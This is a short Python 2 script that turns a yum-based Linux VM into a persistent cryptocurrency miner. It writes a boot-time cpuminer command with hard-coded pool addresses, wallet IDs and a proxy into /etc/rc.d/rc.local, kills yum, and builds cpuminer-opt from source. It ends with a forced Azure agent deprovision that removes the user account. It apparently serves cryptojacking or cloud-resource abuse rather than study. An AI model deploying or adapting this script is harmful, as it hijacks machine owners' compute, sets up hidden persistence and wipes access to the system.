__author__ = 'root'
import time
import urllib2
import urllib
import os,sh,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'cpuminer'
os.system('pkill ' + program)
#os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+10000 -x tcp://10.0.0.5:8118" > /etc/rc.d/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://pool.etn.spacepools.org:1111 -u etnk6BoDzZeWjoYzDinqNfgZzR7Hih3teMfhvLeggVVhGPtHXHaqRdW6kSyRPhSzaM5eBuojKmC3jZHH6Jov1EZL2y58xzB3n9.5000 -x tcp://10.0.0.5:8118" > /etc/rc.d/rc.local')
os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://pool.etn.spacepools.org:1111 -u etnk6BoDzZeWjoYzDinqNfgZzR7Hih3teMfhvLeggVVhGPtHXHaqRdW6kSyRPhSzaM5eBuojKmC3jZHH6Jov1EZL2y58xzB3n9.5000 -t 7 -x tcp://10.0.0.5:8118" > /etc/rc.d/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u 33s2h7f3jc3MW4szYxqVVhNEmLadcneeJS -x tcp://10.0.0.5:8118" > /etc/rc.d/rc.local')
os.system ('chmod +x /etc/rc.d/rc.local')
os.system('pkill yum')
os.system('rm -rf cpuminer-opt')
os.system ('yum install -y automake gcc make curl-devel openssl openssl-devel gmp-devel gcc-c++')
#os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
os.system ('git clone https://github.com/JayDDee/cpuminer-opt.git')
os.chdir('cpuminer-opt')
os.system ('./build.sh')
os.system ('make')
os.system ('make install')
os.system('cp -f /usr/local/bin/cpuminer /usr/bin/cpuminer')
for x in range(0,3):
  try:
    if os.path.isfile('/usr/local/bin/cpuminer') == False:
        os.system('pkill yum')
        os.system('rm -rf cpuminer-opt')
        os.system ('yum install -y automake gcc make curl-devel openssl openssl-devel gmp-devel gcc-c++')
        #os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
        os.system ('git clone https://github.com/JayDDee/cpuminer-opt.git')
        os.chdir('cpuminer-opt')
        os.system ('./build.sh')
        os.system ('make')
        os.system ('make install')
        os.system('cp -f /usr/local/bin/cpuminer /usr/bin/cpuminer')
        time.sleep (2)
  except:
    pass
os.system ('waagent -deprovision+user -force')
